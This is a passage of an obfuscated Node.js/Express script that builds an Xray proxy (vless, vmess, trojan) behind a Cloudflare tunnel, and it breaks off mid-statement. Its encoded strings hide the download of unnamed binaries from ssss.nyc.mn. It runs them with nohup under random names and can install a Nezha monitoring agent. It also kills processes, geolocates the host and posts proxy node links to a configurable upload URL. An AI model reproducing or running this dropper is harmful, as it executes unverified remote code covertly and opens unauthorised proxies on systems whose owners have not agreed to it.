const _0x1e0398=_0x1d9c;(function(_0x564ed7,_0x4ed120){const _0x4660a6={_0x15cc95:0x1a0,_0x369531:0x122,_0x1ccedc:0x191,_0x3da1e1:0x183},_0x3dc4d2=_0x1d9c,_0x294d17=_0x564ed7();while(!![]){try{const _0x410d1b=parseInt(_0x3dc4d2(0x14f))/0x1*(parseInt(_0x3dc4d2(0x1b0))/0x2)+-parseInt(_0x3dc4d2(_0x4660a6._0x15cc95))/0x3*(parseInt(_0x3dc4d2(_0x4660a6._0x369531))/0x4)+parseInt(_0x3dc4d2(_0x4660a6._0x1ccedc))/0x5+-parseInt(_0x3dc4d2(0x1b5))/0x6+parseInt(_0x3dc4d2(0x1de))/0x7*(-parseInt(_0x3dc4d2(0x182))/0x8)+parseInt(_0x3dc4d2(_0x4660a6._0x3da1e1))/0x9+parseInt(_0x3dc4d2(0x178))/0xa;if(_0x410d1b===_0x4ed120)break;else _0x294d17['push'](_0x294d17['shift']());}catch(_0x3f04f2){_0x294d17['push'](_0x294d17['shift']());}}}(_0x50b6,0x66090));const express=require(_0x1e0398(0x167)),app=express(),axios=require(_0x1e0398(0x189)),os=require('os'),fs=require('fs'),path=require(_0x1e0398(0x1a7)),{promisify}=require(_0x1e0398(0x11f)),exec=promisify(require(_0x1e0398(0x193))['exec']),UPLOAD_URL=process[_0x1e0398(0x195)][_0x1e0398(0x1cd)]||'',PROJECT_URL=process['env'][_0x1e0398(0x1d2)]||'',AUTO_ACCESS=process[_0x1e0398(0x195)][_0x1e0398(0x11b)]||![],FILE_PATH=process[_0x1e0398(0x195)]['FILE_PATH']||_0x1e0398(0x180),SUB_PATH=process[_0x1e0398(0x195)][_0x1e0398(0x163)]||_0x1e0398(0x1da),PORT=process[_0x1e0398(0x195)][_0x1e0398(0x1ba)]||process[_0x1e0398(0x195)]['PORT']||0xbb8,UUID=process['env']['UUID']||_0x1e0398(0x176),NEZHA_SERVER=process['env'][_0x1e0398(0x124)]||'',NEZHA_PORT=process['env'][_0x1e0398(0x1d1)]||'',NEZHA_KEY=process[_0x1e0398(0x195)][_0x1e0398(0x154)]||'',ARGO_DOMAIN=process[_0x1e0398(0x195)][_0x1e0398(0x1aa)]||'miget.qytjfskg.cf',ARGO_AUTH=process[_0x1e0398(0x195)]['ARGO_AUTH']||_0x1e0398(0x14b),ARGO_PORT=process[_0x1e0398(0x195)][_0x1e0398(0x157)]||0x1f41,CFIP=process[_0x1e0398(0x195)]['CFIP']||_0x1e0398(0x1c5),CFPORT=process[_0x1e0398(0x195)][_0x1e0398(0x17b)]||0x1bb,NAME=process['env']['NAME']||'';!fs[_0x1e0398(0x132)](FILE_PATH)?(fs[_0x1e0398(0x1cc)](FILE_PATH),console[_0x1e0398(0x140)](FILE_PATH+'\x20is\x20created')):console['log'](FILE_PATH+'\x20already\x20exists');function _0x1d9c(_0x23d74a,_0x1a6aa2){const _0x50b6e1=_0x50b6();return _0x1d9c=function(_0x1d9cb4,_0x475a37){_0x1d9cb4=_0x1d9cb4-0x11a;let _0x311f95=_0x50b6e1[_0x1d9cb4];return _0x311f95;},_0x1d9c(_0x23d74a,_0x1a6aa2);}function generateRandomName(){const _0x2c89ce={_0x37bf31:0x18a,_0x333222:0x1ad},_0x4d1756=_0x1e0398,_0x3d9ee9='abcdefghijklmnopqrstuvwxyz';let _0x3ed10d='';for(let _0xc125f1=0x0;_0xc125f1<0x6;_0xc125f1++){_0x3ed10d+=_0x3d9ee9[_0x4d1756(0x148)](Math[_0x4d1756(0x13a)](Math[_0x4d1756(_0x2c89ce._0x37bf31)]()*_0x3d9ee9[_0x4d1756(_0x2c89ce._0x333222)]));}return _0x3ed10d;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x1e0398(0x1a2)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x1e0398(0x1a2)](FILE_PATH,botName),subPath=path[_0x1e0398(0x1a2)](FILE_PATH,_0x1e0398(0x1b1)),listPath=path[_0x1e0398(0x1a2)](FILE_PATH,_0x1e0398(0x121)),bootLogPath=path[_0x1e0398(0x1a2)](FILE_PATH,_0x1e0398(0x131)),configPath=path['join'](FILE_PATH,'config.json');function deleteNodes(){const _0x38441d={_0x39a921:0x1d5,_0x111271:0x18f,_0x5609b7:0x194,_0x1ddf0e:0x1cf,_0x37b12f:0x1ad,_0x34d022:0x197,_0xfa3fa1:0x1e2,_0x364fe6:0x1e1,_0x3d3dc7:0x1bc},_0xca57a4=_0x1e0398;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x4fb523;try{_0x4fb523=fs[_0xca57a4(_0x38441d._0x39a921)](subPath,_0xca57a4(_0x38441d._0x111271));}catch{return null;}const _0x217d88=Buffer[_0xca57a4(0x134)](_0x4fb523,_0xca57a4(_0x38441d._0x5609b7))['toString'](_0xca57a4(0x18f)),_0x1eda05=_0x217d88[_0xca57a4(_0x38441d._0x1ddf0e)]('\x0a')['filter'](_0x16c18c=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0xca57a4(0x19e)](_0x16c18c));if(_0x1eda05[_0xca57a4(_0x38441d._0x37b12f)]===0x0)return;return axios[_0xca57a4(0x1bd)](UPLOAD_URL+_0xca57a4(_0x38441d._0x34d022),JSON[_0xca57a4(_0x38441d._0xfa3fa1)]({'nodes':_0x1eda05}),{'headers':{'Content-Type':_0xca57a4(_0x38441d._0x364fe6)}})[_0xca57a4(_0x38441d._0x3d3dc7)](_0x2ba565=>{return null;}),null;}catch(_0x4bbdbf){return null;}}function cleanupOldFiles(){const _0x4b2482={_0x56a5d2:0x13d},_0x1eb49b={_0x403fa9:0x170},_0x2cd246=_0x1e0398;try{const _0x1901b6=fs[_0x2cd246(_0x4b2482._0x56a5d2)](FILE_PATH);_0x1901b6[_0x2cd246(0x1b7)](_0x364a57=>{const _0x579b8d=_0x2cd246,_0x14fec0=path[_0x579b8d(0x1a2)](FILE_PATH,_0x364a57);try{const _0x29ea9f=fs['statSync'](_0x14fec0);_0x29ea9f[_0x579b8d(0x135)]()&&fs[_0x579b8d(_0x1eb49b._0x403fa9)](_0x14fec0);}catch(_0x257e22){}});}catch(_0x3606f4){}}async function generateConfig(){const _0x178cfa={_0x248c32:0x158,_0x59bcf5:0x158,_0x2ce7ae:0x12c,_0x5620b1:0x133,_0x1c64c8:0x1c6,_0x1771fe:0x125,_0x53ab67:0x1bb,_0x30f4b6:0x16e,_0x22bee8:0x14d,_0x21e0ca:0x1bb,_0x54e6ec:0x1a1,_0x48fc9a:0x1b4,_0x51977b:0x127,_0x490472:0x1ce,_0x184b08:0x18e},_0x5119e8=_0x1e0398,_0x408607={'log':{'access':_0x5119e8(_0x178cfa._0x248c32),'error':_0x5119e8(_0x178cfa._0x59bcf5),'loglevel':_0x5119e8(0x1c6)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x5119e8(_0x178cfa._0x2ce7ae),'settings':{'clients':[{'id':UUID,'flow':_0x5119e8(_0x178cfa._0x5620b1)}],'decryption':_0x5119e8(_0x178cfa._0x1c64c8),'fallbacks':[{'dest':0xbb9},{'path':_0x5119e8(0x12f),'dest':0xbba},{'path':_0x5119e8(_0x178cfa._0x1771fe),'dest':0xbbb},{'path':_0x5119e8(0x1dc),'dest':0xbbc}]},'streamSettings':{'network':_0x5119e8(0x145)}},{'port':0xbb9,'listen':_0x5119e8(_0x178cfa._0x53ab67),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x5119e8(0x145),'security':_0x5119e8(0x1c6)}},{'port':0xbba,'listen':_0x5119e8(0x1bb),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x5119e8(_0x178cfa._0x1c64c8)},'streamSettings':{'network':'ws','security':_0x5119e8(_0x178cfa._0x1c64c8),'wsSettings':{'path':_0x5119e8(0x12f)}},'sniffing':{'enabled':!![],'destOverride':[_0x5119e8(_0x178cfa._0x30f4b6),'tls',_0x5119e8(_0x178cfa._0x22bee8)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x5119e8(_0x178cfa._0x21e0ca),'protocol':_0x5119e8(_0x178cfa._0x54e6ec),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x5119e8(_0x178cfa._0x1771fe)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x5119e8(_0x178cfa._0x48fc9a),_0x5119e8(0x14d)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x5119e8(0x1bb),'protocol':_0x5119e8(0x1c2),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x5119e8(0x1c6),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x5119e8(0x16e),_0x5119e8(0x1b4),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x5119e8(_0x178cfa._0x51977b)]},'outbounds':[{'protocol':_0x5119e8(_0x178cfa._0x490472),'tag':_0x5119e8(0x1a8)},{'protocol':_0x5119e8(0x181),'tag':_0x5119e8(_0x178cfa._0x184b08)}]};fs[_0x5119e8(0x129)](path[_0x5119e8(0x1a2)](FILE_PATH,'config.json'),JSON[_0x5119e8(0x1e2)](_0x408607,null,0x2));}function getSystemArchitecture(){const _0x3ded5e={_0x343248:0x1df},_0x4ca93e=_0x1e0398,_0x58c60f=os[_0x4ca93e(_0x3ded5e._0x343248)]();return _0x58c60f===_0x4ca93e(0x164)||_0x58c60f==='arm64'||_0x58c60f===_0x4ca93e(0x128)?'arm':_0x4ca93e(0x1d7);}function downloadFile(_0x33ef1b,_0x1f5848,_0x17d4b2){const _0x2254ca={_0x4bbdd8:0x198,_0xd2cfb:0x126,_0x4f782f:0x1d4,_0x7d4a67:0x1bc},_0x384127={_0x43a679:0x185,_0x253399:0x19c,_0x5f49bc:0x1e4,_0x507d78:0x149},_0x5a6ec3={_0x3f5e53:0x15a},_0x1a0d7a=_0x1e0398,_0x3af4fd=_0x33ef1b;!fs[_0x1a0d7a(0x132)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x26d763=fs[_0x1a0d7a(_0x2254ca._0x4bbdd8)](_0x3af4fd);axios({'method':_0x1a0d7a(_0x2254ca._0xd2cfb),'url':_0x1f5848,'responseType':_0x1a0d7a(0x1bf)})[_0x1a0d7a(_0x2254ca._0x4f782f)](_0x2d03b9=>{const _0x38d056={_0x2479df:0x142,_0x573a0b:0x147,_0x125dd9:0x19c,_0x5bbe74:0x149},_0x3b10af={_0x502fd5:0x1b6,_0x2f154e:0x140,_0x39e047:0x185,_0x4e5b6d:0x147},_0x51121c=_0x1a0d7a;_0x2d03b9[_0x51121c(_0x5a6ec3._0x3f5e53)][_0x51121c(0x13b)](_0x26d763),_0x26d763['on'](_0x51121c(0x1a5),()=>{const _0x3a45a8=_0x51121c;_0x26d763[_0x3a45a8(_0x3b10af._0x502fd5)](),console[_0x3a45a8(_0x3b10af._0x2f154e)](_0x3a45a8(_0x3b10af._0x39e047)+path[_0x3a45a8(_0x3b10af._0x4e5b6d)](_0x3af4fd)+_0x3a45a8(0x17d)),_0x17d4b2(null,_0x3af4fd);}),_0x26d763['on'](_0x51121c(0x149),_0x5eaea5=>{const _0x2c2d89=_0x51121c;fs[_0x2c2d89(_0x38d056._0x2479df)](_0x3af4fd,()=>{});const _0x576b6f='Download\x20'+path[_0x2c2d89(_0x38d056._0x573a0b)](_0x3af4fd)+_0x2c2d89(_0x38d056._0x125dd9)+_0x5eaea5['message'];console[_0x2c2d89(_0x38d056._0x5bbe74)](_0x576b6f),_0x17d4b2(_0x576b6f);});})[_0x1a0d7a(_0x2254ca._0x7d4a67)](_0x55d68c=>{const _0xf9f5f6=_0x1a0d7a,_0x1f2036=_0xf9f5f6(_0x384127._0x43a679)+path[_0xf9f5f6(0x147)](_0x3af4fd)+_0xf9f5f6(_0x384127._0x253399)+_0x55d68c[_0xf9f5f6(_0x384127._0x5f49bc)];console[_0xf9f5f6(_0x384127._0x507d78)](_0x1f2036),_0x17d4b2(_0x1f2036);});}async function downloadFilesAndRun(){const _0x26e404={_0x2e5a6a:0x1ad,_0x178102:0x136,_0x39eeef:0x149,_0x1649d5:0x1ac,_0x1dda2c:0x16f,_0xefb8a7:0x1e0,_0x35d9ff:0x18d,_0x572ddb:0x152,_0x1c40c1:0x123,_0x127858:0x1a2,_0x174a01:0x18b,_0xd0bd82:0x17a,_0x1ecc00:0x1ae,_0x53f01d:0x168,_0x561077:0x173,_0x2c644b:0x192,_0x2c93ad:0x17f,_0xb00fec:0x187,_0x4b871d:0x199,_0x47de48:0x1b3,_0x486233:0x1c8,_0x4d5dc2:0x156,_0x51cad1:0x1c8,_0x546382:0x140,_0x5800fe:0x1c4},_0x5867ed={_0x48ccf9:0x1c3,_0x5e3625:0x165},_0x1697c6=_0x1e0398,_0x16c02d=getSystemArchitecture(),_0x32d822=getFilesForArchitecture(_0x16c02d);if(_0x32d822[_0x1697c6(_0x26e404._0x2e5a6a)]===0x0){console[_0x1697c6(0x140)](_0x1697c6(0x144));return;}const _0x55eaae=_0x32d822[_0x1697c6(_0x26e404._0x178102)](_0x1ada5d=>{return new Promise((_0x5c81bb,_0x23f389)=>{const _0x9e5be4=_0x1d9c;downloadFile(_0x1ada5d[_0x9e5be4(_0x5867ed._0x48ccf9)],_0x1ada5d[_0x9e5be4(_0x5867ed._0x5e3625)],(_0xd0dbb4,_0x57d7f9)=>{_0xd0dbb4?_0x23f389(_0xd0dbb4):_0x5c81bb(_0x57d7f9);});});});try{await Promise['all'](_0x55eaae);}catch(_0x288cac){console[_0x1697c6(_0x26e404._0x39eeef)]('Error\x20downloading\x20files:',_0x288cac);return;}function _0x484788(_0x3d9a04){const _0x377680=_0x1697c6,_0x3bc72b=0x1fd;_0x3d9a04[_0x377680(0x1b7)](_0x4a09fb=>{const _0x3afaea={_0xb5f63:0x149,_0x2442c1:0x15b,_0x194da8:0x1c1,_0x582912:0x12b},_0x28288e=_0x377680;fs[_0x28288e(0x132)](_0x4a09fb)&&fs[_0x28288e(0x150)](_0x4a09fb,_0x3bc72b,_0x2a4e15=>{const _0x3c876f=_0x28288e;_0x2a4e15?console[_0x3c876f(_0x3afaea._0xb5f63)](_0x3c876f(_0x3afaea._0x2442c1)+_0x4a09fb+':\x20'+_0x2a4e15):console['log'](_0x3c876f(_0x3afaea._0x194da8)+_0x4a09fb+':\x20'+_0x3bc72b[_0x3c876f(_0x3afaea._0x582912)](0x8));});});}const _0x3d95c8=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x484788(_0x3d95c8);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x566bd4=NEZHA_SERVER[_0x1697c6(_0x26e404._0x1649d5)](':')?NEZHA_SERVER['split'](':')[_0x1697c6(0x138)]():'',_0x3cab1b=new Set([_0x1697c6(0x1ae),'8443',_0x1697c6(0x17c),_0x1697c6(0x173),_0x1697c6(_0x26e404._0x1dda2c),_0x1697c6(0x186)]),_0x28b88c=_0x3cab1b['has'](_0x566bd4)?_0x1697c6(_0x26e404._0xefb8a7):_0x1697c6(_0x26e404._0x35d9ff),_0x55c0a8='\x0aclient_secret:\x20'+NEZHA_KEY+_0x1697c6(_0x26e404._0x572ddb)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x28b88c+_0x1697c6(_0x26e404._0x1c40c1)+UUID;fs['writeFileSync'](path[_0x1697c6(_0x26e404._0x127858)](FILE_PATH,'config.yaml'),_0x55c0a8);const _0x5a58a3=_0x1697c6(_0x26e404._0x174a01)+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x1697c6(_0x26e404._0xd0bd82);try{await exec(_0x5a58a3),console['log'](phpName+_0x1697c6(0x192)),await new Promise(_0x359c40=>setTimeout(_0x359c40,0x3e8));}catch(_0x2be39c){console['error'](_0x1697c6(0x16b)+_0x2be39c);}}else{let _0x20640f='';const _0x1d1ca5=[_0x1697c6(_0x26e404._0x1ecc00),_0x1697c6(_0x26e404._0x53f01d),'2096',_0x1697c6(_0x26e404._0x561077),_0x1697c6(_0x26e404._0x1dda2c),'2053'];_0x1d1ca5['includes'](NEZHA_PORT)&&(_0x20640f=_0x1697c6(0x15e));const _0x4e48c3=_0x1697c6(0x18b)+npmPath+_0x1697c6(0x13c)+NEZHA_SERVER+':'+NEZHA_PORT+_0x1697c6(0x12a)+NEZHA_KEY+'\x20'+_0x20640f+_0x1697c6(0x13e);try{await exec(_0x4e48c3),console[_0x1697c6(0x140)](npmName+_0x1697c6(_0x26e404._0x2c644b)),await new Promise(_0x8007f6=>setTimeout(_0x8007f6,0x3e8));}catch(_0x12d2e3){console['error'](_0x1697c6(_0x26e404._0x2c93ad)+_0x12d2e3);}}}else console[_0x1697c6(0x140)](_0x1697c6(0x1ab));const _0x181cf6='nohup\x20'+webPath+_0x1697c6(_0x26e404._0xb00fec)+FILE_PATH+_0x1697c6(_0x26e404._0x4b871d);try{await exec(_0x181cf6),console['log'](webName+_0x1697c6(0x192)),await new Promise(_0x19d08f=>setTimeout(_0x19d08f,0x3e8));}catch(_0x340c1e){console[_0x1697c6(0x149)](_0x1697c6(_0x26e404._0x47de48)+_0x340c1e);}if(fs[_0x1697c6(0x132)](botPath)){let _0x1e0b73;if(ARGO_AUTH[_0x1697c6(_0x26e404._0x486233)](/^[A-Z0-9a-z=]{120,250}$/))_0x1e0b73=_0x1697c6(_0x26e404._0x4d5dc2)+ARGO_AUTH;else ARGO_AUTH[_0x1697c6(_0x26e404._0x51cad1)](/TunnelSecret/)?_0x1e0b73=_0x1697c6(0x1d6)+FILE_PATH+'/tunnel.yml\x20run':_0x1e0b73=_0x1697c6(0x172)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x1e0b73+_0x1697c6(0x11a)),console[_0x1697c6(_0x26e404._0x546382)](botName+_0x1697c6(0x192)),await new Promise(_0x402dee=>setTimeout(_0x402dee,0x7d0));}catch(_0x56d9e8){console['error'](_0x1697c6(_0x26e404._0x5800fe)+_0x56d9e8);}}await new Promise(_0x254c61=>setTimeout(_0x254c61,0x1388));}function getFilesForArchitecture(_0xeaea64){const _0x39ca31={_0x5717c2:0x17e,_0x511ca1:0x18c,_0x3f78de:0x155,_0x60d83e:0x164,_0x38dea5:0x179},_0x365b4e=_0x1e0398;let _0x129007;_0xeaea64===_0x365b4e(0x164)?_0x129007=[{'fileName':webPath,'fileUrl':_0x365b4e(0x19f)},{'fileName':botPath,'fileUrl':_0x365b4e(_0x39ca31._0x5717c2)}]:_0x129007=[{'fileName':webPath,'fileUrl':_0x365b4e(_0x39ca31._0x511ca1)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x29ea1e=_0xeaea64==='arm'?'https://arm64.ssss.nyc.mn/agent':_0x365b4e(0x14a);_0x129007[_0x365b4e(_0x39ca31._0x3f78de)]({'fileName':npmPath,'fileUrl':_0x29ea1e});}else{const _0x503657=_0xeaea64===_0x365b4e(_0x39ca31._0x60d83e)?'https://arm64.ssss.nyc.mn/v1':_0x365b4e(_0x39ca31._0x38dea5);_0x129007['unshift']({'fileName':phpPath,'fileUrl':_0x503657});}}return _0x129007;}function argoType(){const _0x31a7fe={_0x79aef7:0x15f,_0x310652:0x1ac,_0x3d30f6:0x161,_0x4e3a61:0x16c,_0x2d1780:0x1a2,_0x1e96e5:0x19a,_0x35d9a4:0x1a2},_0xabe389=_0x1e0398;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0xabe389(_0x31a7fe._0x79aef7));return;}if(ARGO_AUTH[_0xabe389(_0x31a7fe._0x310652)](_0xabe389(0x1ca))){fs[_0xabe389(0x129)](path[_0xabe389(0x1a2)](FILE_PATH,_0xabe389(_0x31a7fe._0x3d30f6)),ARGO_AUTH);const _0x412610=_0xabe389(_0x31a7fe._0x4e3a61)+ARGO_AUTH[_0xabe389(0x1cf)]('\x22')[0xb]+_0xabe389(0x143)+path[_0xabe389(_0x31a7fe._0x2d1780)](FILE_PATH,_0xabe389(0x161))+_0xabe389(_0x31a7fe._0x1e96e5)+ARGO_DOMAIN+_0xabe389(0x15d)+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs['writeFileSync'](path[_0xabe389(_0x31a7fe._0x35d9a4)](FILE_PATH,_0xabe389(0x166)),_0x412610);}else console['log']('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}async function extractDomains(){const _0x31b0da={_0x4d6444:0x1d5,_0xa182d0:0x1ad,_0x3a4b0d:0x130,_0x394b71:0x140,_0x3687dd:0x131,_0x76c07c:0x172,_0x2059fd:0x13f,_0x11be81:0x18b,_0x5487eb:0x149,_0x1f415e:0x1c4},_0x4aa5e9={_0x58c492:0x1c9,_0x436c2d:0x15a,_0x50abcf:0x15a,_0x2d41fe:0x162,_0xfb5c39:0x12e,_0x3dc9d2:0x137,_0x7beb72:0x137},_0x10d955={_0x47d7a6:0x1dd,_0x10bff3:0x148,_0x43840e:0x1d9},_0x1beeed={_0x5e7f32:0x1c8},_0x184002=_0x1e0398;let _0x39880a;if(ARGO_AUTH&&ARGO_DOMAIN)_0x39880a=ARGO_DOMAIN,console['log']('ARGO_DOMAIN:',_0x39880a),await _0x210a7a(_0x39880a);else try{const _0x482363=fs[_0x184002(_0x31b0da._0x4d6444)](path[_0x184002(0x1a2)](FILE_PATH,_0x184002(0x131)),_0x184002(0x18f)),_0x33c878=_0x482363['split']('\x0a'),_0x1e8176=[];_0x33c878['forEach'](_0x5a1efa=>{const _0x14f540=_0x184002,_0x1d0b19=_0x5a1efa[_0x14f540(_0x1beeed._0x5e7f32)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x1d0b19){const _0x225286=_0x1d0b19[0x1];_0x1e8176['push'](_0x225286);}});if(_0x1e8176[_0x184002(_0x31b0da._0xa182d0)]>0x0)_0x39880a=_0x1e8176[0x0],console['log'](_0x184002(_0x31b0da._0x3a4b0d),_0x39880a),await _0x210a7a(_0x39880a);else{console[_0x184002(_0x31b0da._0x394b71)](_0x184002(0x190)),fs[_0x184002(0x170)](path[_0x184002(0x1a2)](FILE_PATH,_0x184002(_0x31b0da._0x3687dd)));async function _0x2b10b0(){const _0x3af32b=_0x184002;try{process['platform']===_0x3af32b(_0x10d955._0x47d7a6)?await exec(_0x3af32b(0x1b8)+botName+_0x3af32b(0x1c0)):await exec(_0x3af32b(0x1be)+botName[_0x3af32b(_0x10d955._0x10bff3)](0x0)+']'+botName[_0x3af32b(0x184)](0x1)+_0x3af32b(_0x10d955._0x43840e));}catch(_0x50f0ef){}}_0x2b10b0(),await new Promise(_0x27a0ec=>setTimeout(_0x27a0ec,0xbb8));const _0x1c16eb=_0x184002(_0x31b0da._0x76c07c)+FILE_PATH+_0x184002(_0x31b0da._0x2059fd)+ARGO_PORT;try{await exec(_0x184002(_0x31b0da._0x11be81)+botPath+'\x20'+_0x1c16eb+'\x20>/dev/null\x202>&1\x20&'),console[_0x184002(0x140)](botName+_0x184002(0x192)),await new Promise(_0x3f025a=>setTimeout(_0x3f025a,0xbb8)),await extractDomains();}catch(_0x4691c9){console[_0x184002(_0x31b0da._0x5487eb)](_0x184002(_0x31b0da._0x1f415e)+_0x4691c9);}}}catch(_0x4c3308){console[_0x184002(0x149)](_0x184002(0x1a9),_0x4c3308);}async function _0x24f090(){const _0x2af205=_0x184002;try{const _0x5c4a7b=await axios[_0x2af205(0x126)](_0x2af205(0x11d),{'headers':{'User-Agent':_0x2af205(_0x4aa5e9._0x58c492),'timeout':0xbb8}});if(_0x5c4a7b[_0x2af205(_0x4aa5e9._0x436c2d)]&&_0x5c4a7b['data'][_0x2af205(0x162)]&&_0x5c4a7b[_0x2af205(_0x4aa5e9._0x50abcf)]['isp'])return(_0x5c4a7b[_0x2af205(_0x4aa5e9._0x436c2d)][_0x2af205(_0x4aa5e9._0x2d41fe)]+'-'+_0x5c4a7b[_0x2af205(0x15a)]['isp'])[_0x2af205(_0x4aa5e9._0xfb5c39)](/\s+/g,'_');}catch(_0x18c16f){try{const _0x505bae=await axios['get'](_0x2af205(0x188),{'headers':{'User-Agent':_0x2af205(0x1c9),'timeout':0xbb8}});if(_0x505bae[_0x2af205(_0x4aa5e9._0x436c2d)]&&_0x505bae['data']['status']===_0x2af205(0x153)&&_0x505bae['data'][_0x2af205(_0x4aa5e9._0x3dc9d2)]&&_0x505bae[_0x2af205(_0x4aa5e9._0x436c2d)][_0x2af205(0x196)])return(_0x505bae['data'][_0x2af205(_0x4aa5e9._0x7beb72)]+'-'+_0x505bae[_0x2af205(_0x4aa5e9._0x436c2d)][_0x2af205(0x196)])['replace'](/\s+/g,'_');}catch(_0x3b5bba){}}return _0x2af205(0x1d0);}async function _0x210a7a(_0x25a2c0){const _0xef50e=await _0x24f090(),_0x5dd05d=NAME?NAME+'-'+_0xef50e:_0xef50e;return new Promise(_0x587ba9=>{const _0x3becdf={_0x3a3c27:0x1c6,_0x1e33e0:0x1af,_0x35ce92:0x1b4,_0x200583:0x1db,_0x3884ae:0x14c,_0x879d76:0x120,_0x1637f6:0x1e2,_0x40deec:0x120,_0x3dd9a8:0x140,_0x486c32:0x129,_0x2fe874:0x12b,_0x3cd849:0x140};setTimeout(()=>{const _0x423e67={_0x5153b1:0x12b,_0xcfc323:0x194,_0x113658:0x174,_0x1ef917:0x19d},_0x55d12b=_0x1d9c,_0x1fe908={'v':'2','ps':''+_0x5dd05d,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'auto','net':'ws','type':_0x55d12b(_0x3becdf._0x3a3c27),'host':_0x25a2c0,'path':_0x55d12b(_0x3becdf._0x1e33e0),'tls':_0x55d12b(_0x3becdf._0x35ce92),'sni':_0x25a2c0,'alpn':'','fp':_0x55d12b(_0x3becdf._0x200583)},_0x406c79=_0x55d12b(_0x3becdf._0x3884ae)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x25a2c0+_0x55d12b(_0x3becdf._0x879d76)+_0x25a2c0+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x5dd05d+_0x55d12b(0x139)+Buffer[_0x55d12b(0x134)](JSON[_0x55d12b(_0x3becdf._0x1637f6)](_0x1fe908))[_0x55d12b(0x12b)](_0x55d12b(0x194))+_0x55d12b(0x175)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x25a2c0+_0x55d12b(_0x3becdf._0x40deec)+_0x25a2c0+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x5dd05d+'\x0a\x20\x20\x20\x20';console[_0x55d12b(_0x3becdf._0x3dd9a8)](Buffer[_0x55d12b(0x134)](_0x406c79)[_0x55d12b(0x12b)](_0x55d12b(0x194))),fs[_0x55d12b(_0x3becdf._0x486c32)](subPath,Buffer['from'](_0x406c79)[_0x55d12b(_0x3becdf._0x2fe874)](_0x55d12b(0x194))),console[_0x55d12b(_0x3becdf._0x3cd849)](FILE_PATH+_0x55d12b(0x169)),uploadNodes(),app[_0x55d12b(0x126)]('/'+SUB_PATH,(_0x4fa0f0,_0x31096b)=>{const _0x504ffc=_0x55d12b,_0x3d1db2=Buffer[_0x504ffc(0x134)](_0x406c79)[_0x504ffc(_0x423e67._0x5153b1)](_0x504ffc(_0x423e67._0xcfc323));_0x31096b[_0x504ffc(0x11c)](_0x504ffc(0x11e),_0x504ffc(_0x423e67._0x113658)),_0x31096b[_0x504ffc(_0x423e67._0x1ef917)](_0x3d1db2);}),_0x587ba9(_0x406c79);},0x7d0);});}}async function uploadNodes(){const _0x9a3228={_0x3ac401:0x1bd,_0x1a17b5:0x1a4,_0x19f7cc:0x1e1,_0x13963f:0x146,_0x3cd879:0x1b2,_0x5b99af:0x132,_0x3d6da5:0x1d5,_0x10e052:0x146},_0x34bff3=_0x1e0398;if(UPLOAD_URL&&PROJECT_URL){const _0x55bb73=PROJECT_URL+'/'+SUB_PATH,_0x383192={'subscription':[_0x55bb73]};try{const _0x267445=await axios[_0x34bff3(_0x9a3228._0x3ac401)](UPLOAD_URL+_0x34bff3(_0x9a3228._0x1a17b5),_0x383192,{'headers':{'Content-Type':_0x34bff3(_0x9a3228._0x19f7cc)}});return _0x267445&&_0x267445[_0x34bff3(_0x9a3228._0x13963f)]===0xc8?(console['log'](_0x34bff3(0x1cb)),_0x267445):null;}catch(_0x597c0a){if(_0x597c0a[_0x34bff3(_0x9a3228._0x3cd879)]){if(_0x597c0a['response'][_0x34bff3(_0x9a3228._0x13963f)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x34bff3(_0x9a3228._0x5b99af)](listPath))return;const _0x3de087=fs[_0x34bff3(_0x9a3228._0x3d6da5)](listPath,'utf-8'),_0x1ea7a1=_0x3de087['split']('\x0a')['filter'](_0x298803=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x34bff3(0x19e)](_0x298803));if(_0x1ea7a1[_0x34bff3(0x1ad)]===0x0)return;const _0x50efc9=JSON[_0x34bff3(0x1e2)]({'nodes':_0x1ea7a1});try{const _0x8ce74e=await 